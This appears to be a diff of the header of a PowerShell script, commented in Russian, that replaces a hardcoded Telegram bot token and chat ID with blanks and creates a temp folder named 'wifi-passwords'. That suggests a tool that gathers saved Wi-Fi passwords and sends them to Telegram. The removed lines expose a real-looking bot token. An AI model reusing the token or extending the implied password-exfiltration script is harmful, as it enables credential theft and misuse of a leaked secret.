@@ -1,6 +1,6 @@
 # Параметры бота Telegram
-$BotToken = "8013680506:AAHzKXQVcb7fE0WYWo_faMCogkHnqPm33ak"  # Замените на ваш токен
-$ChatID = "259082534"                                         # Замените на ваш Chat ID
+$BotToken = ""  # Замените на ваш токен
+$ChatID = ""                                         # Замените на ваш Chat ID
 
 # Создаем временную директорию
 $TempDir = "$env:temp\wifi-passwords"
